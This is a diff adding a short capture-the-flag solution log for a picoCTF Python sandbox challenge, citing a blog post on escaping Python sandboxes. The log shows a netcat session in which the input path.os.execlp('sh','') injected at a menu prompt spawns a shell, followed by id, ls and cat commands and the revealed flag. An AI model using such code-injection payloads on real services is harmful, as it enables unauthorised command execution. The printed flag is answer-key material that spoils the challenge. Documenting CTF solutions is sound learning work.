@@ -1,0 +1,17 @@
+# http://blog.isis.poly.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/
+
+$ nc python.picoctf.com 6363
+Welcome to the food menu!
+Which description do you want to read?
+[ 0] $ 7.69 Chicken Asada Burrito
+[ 1] $ 6.69 Beef Chow Mein
+[ 2] $ 10.49 MeatBurger Deluxe
+> path.os.execlp('sh','')
+id
+uid=1004(py3) gid=1005(py3) groups=1005(py3)
+ls
+run.sh
+task3.py
+your_flag_here
+cat your_flag_here
+eval_is_super_OSsome
